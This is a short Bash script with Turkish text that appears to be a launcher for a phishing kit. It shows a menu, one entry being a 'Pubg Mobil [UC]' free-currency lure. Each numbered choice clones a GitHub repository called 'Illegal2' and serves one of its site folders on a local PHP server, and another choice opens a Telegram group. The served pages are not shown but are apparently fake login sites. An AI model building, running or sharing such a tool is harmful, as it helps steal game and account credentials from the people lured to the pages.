#!/bin/bash

# Renkli JTH Logo
echo -e "\e[1;35m===========================\e[0m"
echo -e "\e[1;32m      JTH Logo - BİT\e[0m"
echo -e "\e[1;35m===========================\e[0m"
echo ""

# Menü
echo -e "¥《\e[1;34m1\e[0m》"
echo -e "=========♧"
echo -e "¥《\e[1;34m2\e[0m》"
echo -e "=========♧"
echo -e "¥《\e[1;34mPubg Mobil [UC] 3\e[0m》"
echo -e "=========♧"
echo -e "¥《\e[1;34m4\e[0m》"
echo -e "=========♧"
echo -e "¥《\e[1;34m5\e[0m》"
echo -e "=========♧"
echo -e "¥《\e[1;34m6\e[0m》"
echo -e "=========♧"
echo -e "¥《\e[1;34m7\e[0m》"
echo -e "=========♧"
echo -e "¥《\e[1;34m8\e[0m》"
echo -e "=========♧"
echo -e "¥《\e[1;34m9\e[0m》"
echo -e "=========♧"
echo -e "¥《\e[1;31m99\e[0m》"
echo ""
echo -e "@Joker @Ege Cin @Kuralsız"
echo -e "₺DARK WEP₺"

echo ""
echo "Seçiminizi yapın: "
read choice

# Menü seçim işlemi
case $choice in
  1)
    echo "1 seçildi..."
    git clone https://github.com/Illegal2/Jzjzhhdhsh.git
    cd Jzjzhhdhsh/site/1
    echo "PHP sunucu başlatılıyor..."
    php -S localhost:8000 &
    echo "Siteye gitmek için: http://localhost:8000"
    ;;
  2)
    echo "2 seçildi..."
    git clone https://github.com/Illegal2/Jzjzhhdhsh.git
    cd Jzjzhhdhsh/site/2
    echo "PHP sunucu başlatılıyor..."
    php -S localhost:8000 &
    echo "Siteye gitmek için: http://localhost:8000"
    ;;
  3)
    echo "Pubg Mobil [UC] seçildi..."
    git clone https://github.com/Illegal2/Jzjzhhdhsh.git
    cd Jzjzhhdhsh/site/3
    echo "PHP sunucu başlatılıyor..."
    php -S localhost:8000 &
    echo "Siteye gitmek için: http://localhost:8000"
    ;;
  4)
    echo "4 seçildi..."
    git clone https://github.com/Illegal2/Jzjzhhdhsh.git
    cd Jzjzhhdhsh/site/4
    echo "PHP sunucu başlatılıyor..."
    php -S localhost:8000 &
    echo "Siteye gitmek için: http://localhost:8000"
    ;;
  5)
    echo "5 seçildi..."
    git clone https://github.com/Illegal2/Jzjzhhdhsh.git
    cd Jzjzhhdhsh/site/5
    echo "PHP sunucu başlatılıyor..."
    php -S localhost:8000 &
    echo "Siteye gitmek için: http://localhost:8000"
    ;;
  6)
    echo "6 seçildi..."
    git clone https://github.com/Illegal2/Jzjzhhdhsh.git
    cd Jzjzhhdhsh/site/6
    echo "PHP sunucu başlatılıyor..."
    php -S localhost:8000 &
    echo "Siteye gitmek için: http://localhost:8000"
    ;;
  7)
    echo "7 seçildi..."
    git clone https://github.com/Illegal2/Jzjzhhdhsh.git
    cd Jzjzhhdhsh/site/7
    echo "PHP sunucu başlatılıyor..."
    php -S localhost:8000 &
    echo "Siteye gitmek için: http://localhost:8000"
    ;;
  8)
    echo "8 seçildi..."
    git clone https://github.com/Illegal2/Jzjzhhdhsh.git
    cd Jzjzhhdhsh/site/8
    echo "PHP sunucu başlatılıyor..."
    php -S localhost:8000 &
    echo "Siteye gitmek için: http://localhost:8000"
    ;;
  9)
    echo "Site seçildi..."
    # Telegram linkine yönlendirme yapılır
    xdg-open "https://t.me/JTH_chat"
    ;;
  99)
    echo "Çıkılıyor..."
    exit 0
    ;;
  *)
    echo "Geçersiz seçenek! Tekrar deneyin."
    ;;
esac
